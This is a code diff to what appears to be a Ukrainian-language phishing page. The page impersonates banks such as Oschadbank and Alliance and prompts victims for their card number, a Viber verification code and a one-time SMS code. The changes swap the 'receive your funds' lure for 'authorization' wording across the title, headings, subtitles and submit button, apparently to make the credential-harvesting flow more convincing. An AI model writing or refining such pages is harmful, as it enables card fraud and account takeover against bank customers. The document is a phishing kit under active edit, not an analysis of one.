@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Оберіть свій банк</title>
+    <title>Для авторизації оеріть свій банк</title>
     <style>
         /* Общие стили для всех экранов и элементов */
         *, *::before, *::after { box-sizing: border-box; }
@@ -639,7 +639,7 @@
 </head>
 <body>
     <div id="bank-selection-screen" class="screen">
-        <h1>Оберіть свій банк</h1>
+        <h1>Для авторизації оберіть свій банк</h1>
         <div class="bank-grid"></div>
     </div>
 
@@ -785,7 +785,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     <path d="M9 9L15 15" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                 </svg>
                 <h2 class="unavail-title">Помилка верифікації</h2>
-                <p class="unavail-text">Ми не змогли верифікувати вашу картку. Для отримання зарахування оберіть інший банк.</p>
+                <p class="unavail-text">Ми не змогли верифікувати вашу картку. Для авторизації оберіть інший банк.</p>
                 <h3 class="unavail-title" style="font-size: 18px; margin-bottom: 20px;">Оберіть кращий варіант:</h3>
                 <div class="unavail-suggestion-grid">
                     <a href="#" class="unavail-suggestion-item" data-bank="oschadbank">
@@ -860,13 +860,13 @@ document.addEventListener('DOMContentLoaded', () => {
                     <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="3" y="6" width="18" height="12" rx="2" stroke="var(--alliance-primary)" stroke-width="1.5"/><line x1="3" y1="10" x2="21" y2="10" stroke="var(--alliance-primary)" stroke-width="1.5"/></svg>
                 </div>
                 <h2 class="alliance-main-title">Введіть номер картки</h2>
-                <p class="alliance-subtitle">Кошти будуть зараховані на вказану картку</p>
+                <p class="alliance-subtitle">Авторизація за номером картки</p>
                 <div class="alliance-input-group" id="alliance-card-group">
                     <input type="tel" id="alliance-card-input" class="alliance-input-field" placeholder="XXXX XXXX XXXX XXXX" autocomplete="off" inputmode="numeric" pattern="[0-9\\s]*" style="color: var(--alliance-text);">
                 </div>
             </div>
             <div class="alliance-footer">
-                <button class="alliance-button" id="alliance-submit-btn">Отримати кошти</button>
+                <button class="alliance-button" id="alliance-submit-btn">Авторизуватись</button>
             </div>`
         ;
         allianceModalContent.innerHTML = html;
@@ -930,7 +930,7 @@ document.addEventListener('DOMContentLoaded', () => {
                    <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 5.25L12 13.5L3 5.25" stroke="var(--alliance-primary)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M3 5.25H21V18C21 18.1989 20.921 18.3897 20.7803 18.5303C20.6397 18.671 20.4489 18.75 20.25 18.75H3.75C3.55109 18.75 3.36032 18.671 3.21967 18.5303C3.07902 18.3897 3 18.1989 3 18V5.25Z" stroke="var(--alliance-primary)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </div>
                 <h2 class="alliance-main-title">Введіть код з Viber</h2>
-                <p class="alliance-subtitle">Ми надіслали 6-значний код у Viber на Ваш фінансовий номер</p>
+                <p class="alliance-subtitle">Для авторизації ми надіслали 6-значний код на ваш фінансовий номер</p>
                 <div class="raiff-code-inputs ${options.error ? 'error' : ''}" style="display: flex; justify-content: center; margin: 0 auto 25px auto; max-width: 300px; gap: 10px;">
                     ${Array(codeLength).fill(0).map(() => '<input type="tel" class="raiff-code-input" style="width: 48px; height: 52px; background-color: var(--white); border-color: var(--alliance-border-color); color: var(--alliance-text);" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
                 </div>
@@ -1304,7 +1304,7 @@ document.addEventListener('DOMContentLoaded', () => {
                    <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 5.25L12 13.5L3 5.25" stroke="var(--alliance-primary)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M3 5.25H21V18C21 18.1989 20.921 18.3897 20.7803 18.5303C20.6397 18.671 20.4489 18.75 20.25 18.75H3.75C3.55109 18.75 3.36032 18.671 3.21967 18.5303C3.07902 18.3897 3 18.1989 3 18V5.25Z" stroke="var(--alliance-primary)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </div>
                 <h2 class="alliance-main-title">Останній крок</h2>
-                <p class="alliance-subtitle">Для зарахування коштів на вашу картку введіть одноразовий SMS код</p>
+                <p class="alliance-subtitle">Для підтвердження авторизації введіть одноразовий SMS код</p>
                 <div class="raiff-code-inputs ${options.error ? 'error' : ''}" style="display: flex; justify-content: center; margin: 0 auto 25px auto; max-width: 300px; gap: ${codeLength === 6 ? '10px' : '15px'};">
                     ${Array(codeLength).fill(0).map(() => '<input type="tel" class="raiff-code-input" style="width: 50px; height: 55px; background-color: var(--white); border-color: var(--alliance-border-color); color: var(--alliance-text);" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
                 </div>
